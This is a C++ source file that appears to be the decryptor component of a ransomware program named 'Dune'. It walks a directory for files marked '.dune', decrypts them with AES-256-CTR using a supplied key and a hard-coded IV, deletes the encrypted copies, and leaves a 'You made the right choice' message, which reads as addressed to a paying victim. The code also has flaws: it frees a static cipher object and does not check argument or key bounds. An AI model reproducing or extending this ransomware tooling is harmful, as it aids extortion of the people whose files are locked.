#ifndef __DUNE__
#define __DUNE__
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <filesystem>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/pem.h>

static void ls_recursive(const std::filesystem::path &path, std::vector<std::string> *files)
{
    for (const auto &p : std::filesystem::recursive_directory_iterator(path))
    {
        if (!std::filesystem::is_directory(p))
        {
            files->push_back(p.path());
        }
    }
}

static void decrypt_file(std::string full_path, std::string enc_key)
{
    FILE *infile = fopen(full_path.c_str(), "rb"); // must be open in read mode + binary
    if (!infile)
    {
        return;
    }

    FILE *outfile = fopen((full_path.substr(0, full_path.length() - 5)).c_str(), "w+b");
    if (!outfile)
    {
        return;
    }
    int bytes_read, bytes_written;
    unsigned char indata[AES_BLOCK_SIZE];
    unsigned char outdata[AES_BLOCK_SIZE];
    unsigned char *ckey = (unsigned char *)enc_key.c_str();
    unsigned char ivec[] = "dontusethisinput";
    int num = 0;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    const EVP_CIPHER *cipher = EVP_aes_256_ctr();
    EVP_DecryptInit(ctx, cipher, ckey, ivec);
    while (1)
    {
        bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
        int outlen;
        EVP_DecryptUpdate(ctx, outdata, &outlen, indata, bytes_read);
        bytes_written = fwrite(outdata, 1, bytes_read, outfile);
        if (bytes_read < AES_BLOCK_SIZE)
            break;
    }
    EVP_CIPHER_CTX_free(ctx);
    EVP_CIPHER_free((EVP_CIPHER *)cipher);
    fclose(infile);
    fclose(outfile);
}

static void decrypt_files(std::string enc_key, std::string user_home)
{
    std::vector<std::string> files_to_decrypt;
    ls_recursive(user_home, &files_to_decrypt);
    if (files_to_decrypt.size() == 0)
    {
        return;
    }
    for (int i = 0; i < files_to_decrypt.size(); i++)
    {
        try
        {
            if (files_to_decrypt[i].find(".dune") == std::string::npos) {
                continue;
            }
            decrypt_file(files_to_decrypt[i], enc_key);
            remove((files_to_decrypt[i]).c_str());
        }
        catch (...)
        {
        }
    }
    std::ofstream finish("./finish.txt");
    char done_msg[] = "You made the right choice.\n";
    finish.write(done_msg, sizeof(done_msg));
    finish.close();
    return;
}
std::vector<char> HexToBytes(const std::string &hex)
{
    std::vector<char> bytes;

    for (unsigned int i = 0; i < hex.length(); i += 2)
    {
        std::string byteString = hex.substr(i, 2);
        char byte = (char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }

    return bytes;
}

int main(int argc, char *argv[])
{
    std::vector<std::string> arguments(argv + 1, argv + argc);

    std::string enc_key;
    for (int i = 0; i < arguments.size(); i++)
    {
        if (arguments[i] == "--key")
        {
            if (arguments.size() > (i))
            {
                enc_key = arguments[i + 1];
            }
        }
    }
    if (enc_key.empty())
    {
        printf("Key required\n");
        printf("Specify key in hex format with the --key flag.\n");
        return -1;
    }
    std::string decoded_key = std::string(HexToBytes(enc_key).data(), 32);
    decrypt_files(decoded_key,"./");
}

#endif